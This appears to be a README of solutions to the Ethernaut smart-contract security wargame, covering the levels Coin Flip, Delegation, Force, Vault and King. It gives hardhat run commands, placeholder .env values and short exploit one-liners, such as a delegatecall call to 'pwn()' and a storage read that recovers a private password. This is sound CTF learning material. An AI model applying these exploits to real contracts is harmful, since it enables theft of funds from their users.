# Ethernaut

## Coin Flip

Set up the `.env` file with your HTTP_ENDPOINT, PRIVATE_KEY and coin flip instance address.

```dotenv
PRIVATE_KEY="0x0000000000000000000000000000000000000000000000000000000000000000"
HTTP_ENDPOINT="https://eth-rinkeby.alchemyapi.io/v2/xxx"
COIN_FLIP_ADDR="0x0000000000000000000000000000000000000000"
```

run

```bash
npx hardhat run scripts/coin_flip_hack.js --network rinkeby
```

## Delegation

```js
await contract.sendTransaction({data: web3.eth.abi.encodeFunctionSignature("pwn()")})
```

## Force

Set your force contract address in `.env`.

```
ForceAddr="0x0000000000000000000000000000000000000000"
```

run

```bash
npx hardhat run scripts/force_hack.js --network rinkeby
```

references:
- https://ethereum.stackexchange.com/questions/63987/can-a-contract-with-no-payable-function-have-ether/63988#63988
- https://solidity-by-example.org/hacks/self-destruct/ 

## Vault

Get the password with below command run in console.

```
await web3.eth.getStorageAt(instance, 1, console.log)
```

You can use [etherscan](https://rinkeby.etherscan.io) to run the `unlock` function.

## King

Set your king contract address in `.env`.

```
KingAddr="0x0000000000000000000000000000000000000000"
```

run

```bash
npx hardhat run scripts/king_hack.js --network rinkeby
```
